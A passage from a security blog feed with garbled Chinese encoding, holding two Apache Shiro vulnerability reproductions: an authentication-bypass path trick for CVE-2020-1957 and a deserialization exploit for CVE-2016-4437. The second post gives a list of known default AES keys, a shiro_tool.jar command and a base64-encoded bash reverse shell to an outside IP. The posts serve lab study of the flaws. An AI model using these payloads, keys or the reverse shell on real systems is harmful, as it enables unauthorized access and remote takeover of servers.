data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzgwNTQ5L2FydGljbGUvZGV0YWlscy8xMDcwMzE3NDY/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjIxNjIyOTg1OTkzMTY3ODAyNTUyNzgxNDclMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmJsb2cuJTI1MjIlMjU3RCZyZXF1ZXN0X2lkPTE2MjI5ODU5OTMxNjc4MDI1NTI3ODE0NyZiaXpfaWQ9MCZ1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmJsb2d+Zmlyc3RfcmFua192Mn5yYW5rX3YyOS0zLTEwNzAzMTc0Ni5ub25lY2FzZSZ1dG1fdGVybT1DVkUtMjAyMC0xOTU3JnNwbT0xMDE4LjIyMjYuMzAwMS40NDUw">è½®å­è½®å­<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x03-æ¼æ´å¤ç°"><a href="#0x03-æ¼æ´å¤ç°" class="headerlink" title="0x03.æ¼æ´å¤ç°"></a>0x03.æ¼æ´å¤ç°</h2><p><strong>ç¯å¢ƒæ­å»º</strong></p><p><span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLw==">vulhub<i class="fa fa-external-link-alt"></i></span></p><p>adminè®¤è¯ç»•è¿‡</p><p>ç›´æ¥è®¿é—®/adminï¼Œè·³è½¬åˆ°ç™»å…¥é¡µé¢</p><img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_08.png" class><p>ç»•è¿‡ï¼š/demo/..;/admin/  æˆ–   /demo;/../admin/</p><img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_09.png" class><img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_10.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ï¼ˆCVE-2020-1957ï¼‰Apache-Shiro-èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´&quot;&gt;&lt;a href=&quot;#ï¼ˆCVE-2020-1957ï¼‰Apache-Shiro-èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;ï¼ˆCVE-2020-1957ï¼‰Apache Shiro èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´&quot;&gt;&lt;/a&gt;ï¼ˆCVE-2020-1957ï¼‰Apache Shiro èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´&lt;/h2&gt;&lt;hr&gt;
&lt;h2 id=&quot;0x01-æ¼æ´ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x01-æ¼æ´ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x01.æ¼æ´ç®€è¿°&quot;&gt;&lt;/a&gt;0x01.æ¼æ´ç®€è¿°&lt;/h2&gt;&lt;p&gt;Apache Shiro 1.5.2ä¹‹å‰ç‰ˆæœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…å¯å€ŸåŠ©ç‰¹åˆ¶çš„è¯·æ±‚åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡èº«ä»½éªŒè¯ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CVE" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/Shiro/"/>
    
    
    <category term="CVE" scheme="https://lunamoore.github.io/tags/CVE/"/>
    
    <category term="è°ƒæ•™" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/tags/Shiro/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-4437å¤ç°</title>
    <link href="https://lunamoore.github.io/2021/06/06/CVE-2016-4437/"/>
    <id>https://lunamoore.github.io/2021/06/06/CVE-2016-4437/</id>
    <published>2021-06-06T12:54:08.000Z</published>
    <updated>2021-06-06T13:11:13.192Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ï¼ˆCVE-2016-4437ï¼‰Apache-Shiro-ååºåˆ—åŒ–æ¼æ´"><a href="#ï¼ˆCVE-2016-4437ï¼‰Apache-Shiro-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ï¼ˆCVE-2016-4437ï¼‰Apache Shiro ååºåˆ—åŒ–æ¼æ´"></a>ï¼ˆCVE-2016-4437ï¼‰Apache Shiro ååºåˆ—åŒ–æ¼æ´</h2><hr><h2 id="0x01-æ¼æ´ç®€è¿°"><a href="#0x01-æ¼æ´ç®€è¿°" class="headerlink" title="0x01.æ¼æ´ç®€è¿°"></a>0x01.æ¼æ´ç®€è¿°</h2><p>Apache shiroé»˜è®¤ä½¿ç”¨äº†<code>CookieRememberMeManager</code>ï¼Œå…¶å¤„ç†cookieçš„æµç¨‹æ˜¯ï¼šå¾—åˆ°<code>rememberMeçš„cookieå€¼</code>â€“&gt;<code>Base64è§£ç </code>â€“&gt;<code>AESè§£å¯†</code>â€“&gt;<code>ååºåˆ—åŒ–</code>ã€‚<br>ç„¶è€ŒAESçš„å¯†é’¥æ˜¯ç¡¬ç¼–ç çš„ï¼Œå°±å¯¼è‡´äº†æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„æ•°æ®é€ æˆååºåˆ—åŒ–çš„RCEæ¼æ´ã€‚</p><a id="more"></a><h2 id="0x02-å½±å“ç‰ˆæœ¬"><a href="#0x02-å½±å“ç‰ˆæœ¬" class="headerlink" title="0x02.å½±å“ç‰ˆæœ¬"></a>0x02.å½±å“ç‰ˆæœ¬</h2><p>Apache Shiro &lt;= v1.2.4</p><h2 id="0x03-æ¼æ´åˆ†æ"><a href="#0x03-æ¼æ´åˆ†æ" class="headerlink" title="0x03.æ¼æ´åˆ†æ"></a>0x03.æ¼æ´åˆ†æ</h2><p><span class="exturl" data-url="aHR0cHM6Ly9zYXVjZXItbWFuLmNvbS9pbmZvcm1hdGlvbl9zZWN1cml0eS8zOTYuaHRtbA==">ä¸é€ è½®å­äº†ã€‚ã€‚ã€‚<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x04-æ¼æ´å¤ç°"><a href="#0x04-æ¼æ´å¤ç°" class="headerlink" title="0x04.æ¼æ´å¤ç°"></a>0x04.æ¼æ´å¤ç°</h2><p> ç½‘ç»œä¸Šæ”¶é›†åˆ°çš„key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br><span class="line">3qDVdLawoIr1xFd6ietnwg&#x3D;&#x3D;</span><br><span class="line">YI1+nBV&#x2F;&#x2F;m7ELrIyDHm6DQ&#x3D;&#x3D;</span><br><span class="line">6Zm+6I2j5Y+R5aS+5ZOlAA&#x3D;&#x3D;</span><br><span class="line">2A2V+RFLUs+eTA3Kpr+dag&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j3Y+R1aSn5BOlAA&#x3D;&#x3D;</span><br><span class="line">SkZpbmFsQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">2cVtiE83c4lIrELJwKGJUw&#x3D;&#x3D;</span><br><span class="line">fsHspZw&#x2F;92PrS3XrPW+vxw&#x3D;&#x3D;</span><br><span class="line">XTx6CKLo&#x2F;SdSgub+OPHSrw&#x3D;&#x3D;</span><br><span class="line">sHdIjUN6tzhl8xZMG3ULCQ&#x3D;&#x3D;</span><br><span class="line">O4pdf+7e+mZe8NyxMTPJmQ&#x3D;&#x3D;</span><br><span class="line">HWrBltGvEZc14h9VpMvZWw&#x3D;&#x3D;</span><br><span class="line">rPNqM6uKFCyaL10AK51UkQ&#x3D;&#x3D;</span><br><span class="line">Y1JxNSPXVwMkyvES&#x2F;kJGeQ&#x3D;&#x3D;</span><br><span class="line">lT2UvDUmQwewm6mMoiw4Ig&#x3D;&#x3D;</span><br><span class="line">MPdCMZ9urzEA50JDlDYYDg&#x3D;&#x3D;</span><br><span class="line">xVmmoltfpb8tTceuT5R7Bw&#x3D;&#x3D;</span><br><span class="line">c+3hFGPjbgzGdrC+MHgoRQ&#x3D;&#x3D;</span><br><span class="line">ClLk69oNcA3m+s0jIMIkpg&#x3D;&#x3D;</span><br><span class="line">Bf7MfkNR0axGGptozrebag&#x3D;&#x3D;</span><br><span class="line">1tC&#x2F;xrDYs8ey+sa3emtiYw&#x3D;&#x3D;</span><br><span class="line">ZmFsYWRvLnh5ei5zaGlybw&#x3D;&#x3D;</span><br><span class="line">cGhyYWNrY3RmREUhfiMkZA&#x3D;&#x3D;</span><br><span class="line">IduElDUpDDXE677ZkhhKnQ&#x3D;&#x3D;</span><br><span class="line">yeAAo1E8BOeAYfBlm4NG9Q&#x3D;&#x3D;</span><br><span class="line">2itfW92XazYRi5ltW0M2yA&#x3D;&#x3D;</span><br><span class="line">XgGkgqGqYrix9lI6vxcrRw&#x3D;&#x3D;</span><br><span class="line">ertVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">5AvVhmFLUS0ATA4Kprsdag&#x3D;&#x3D;</span><br><span class="line">s0KTA3mFLUprK4AvVhsdag&#x3D;&#x3D;</span><br><span class="line">hBlzKg78ajaZuTE0VLzDDg&#x3D;&#x3D;</span><br><span class="line">9FvVhtFLUs0KnA3Kprsdyg&#x3D;&#x3D;</span><br><span class="line">d2ViUmVtZW1iZXJNZUtleQ&#x3D;&#x3D;</span><br><span class="line">yNeUgSzL&#x2F;CfiWw1GALg6Ag&#x3D;&#x3D;</span><br><span class="line">NGk&#x2F;3cQ6F5&#x2F;UNPRh8LpMIg&#x3D;&#x3D;</span><br><span class="line">4BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">MzVeSkYyWTI2OFVLZjRzZg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><p>ä½¿ç”¨shiro_tool.jaråå¼¹shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar shiro_tool.jar http:<span class="comment">//your_ip:8080</span></span><br></pre></td></tr></table></figure><img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_01.png" class><p>ä½¿ç”¨1å’Œ10éƒ½å¯ä»¥ï¼Œåå¼¹shelléœ€è¦ç¼–ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC84MS43MC4xOTUuMTU5LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>ncç›‘å¬åå¼¹shell</p><img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_02.png" class><p>æŠ“åŒ…åˆ†æï¼Œçœ‹åˆ°httpè¯·æ±‚å¤´Cookieå­—æ®µä¸º rememberMe=**ï¼Œå“åº”å¤´å­˜åœ¨Set-Cookie:rememberMe=deleteMe</p><img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_03.png" class><h2 id="0x05-å®˜æ–¹ä¿®å¤"><a href="#0x05-å®˜æ–¹ä¿®å¤" class="headerlink" title="0x05.å®˜æ–¹ä¿®å¤"></a>0x05.å®˜æ–¹ä¿®å¤</h2><ul><li>åˆ é™¤ä»£ç é‡Œçš„é»˜è®¤å¯†é’¥</li><li>é»˜è®¤é…ç½®é‡Œæ³¨é‡Šäº†é»˜è®¤å¯†é’¥</li><li>å¦‚æœä¸é…ç½®å¯†é’¥ï¼Œæ¯æ¬¡ä¼šé‡æ–°éšæœºä¸€ä¸ªå¯†é’¥</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ï¼ˆCVE-2016-4437ï¼‰Apache-Shiro-ååºåˆ—åŒ–æ¼æ´&quot;&gt;&lt;a href=&quot;#ï¼ˆCVE-2016-4437ï¼‰Apache-Shiro-ååºåˆ—åŒ–æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;ï¼ˆCVE-2016-4437ï¼‰Apache Shiro ååºåˆ—åŒ–æ¼æ´&quot;&gt;&lt;/a&gt;ï¼ˆCVE-2016-4437ï¼‰Apache Shiro ååºåˆ—åŒ–æ¼æ´&lt;/h2&gt;&lt;hr&gt;
&lt;h2 id=&quot;0x01-æ¼æ´ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x01-æ¼æ´ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x01.æ¼æ´ç®€è¿°&quot;&gt;&lt;/a&gt;0x01.æ¼æ´ç®€è¿°&lt;/h2&gt;&lt;p&gt;Apache shiroé»˜è®¤ä½¿ç”¨äº†&lt;code&gt;CookieRememberMeManager&lt;/code&gt;ï¼Œå…¶å¤„ç†cookieçš„æµç¨‹æ˜¯ï¼šå¾—åˆ°&lt;code&gt;rememberMeçš„cookieå€¼&lt;/code&gt;â€“&amp;gt;&lt;code&gt;Base64è§£ç &lt;/code&gt;â€“&amp;gt;&lt;code&gt;AESè§£å¯†&lt;/code&gt;â€“&amp;gt;&lt;code&gt;ååºåˆ—åŒ–&lt;/code&gt;ã€‚&lt;br&gt;ç„¶è€ŒAESçš„å¯†é’¥æ˜¯ç¡¬ç¼–ç çš„ï¼Œå°±å¯¼è‡´äº†æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„æ•°æ®é€ æˆååºåˆ—åŒ–çš„RCEæ¼æ´ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CVE" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/Shiro/"/>
    
    
    <category term="CVE" scheme="https://lunamoore.github.io/tags/CVE/"/>
    
    <category term="è°ƒæ•™" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/tags/Shiro/"/>
    
  </entry>
  
</feed>
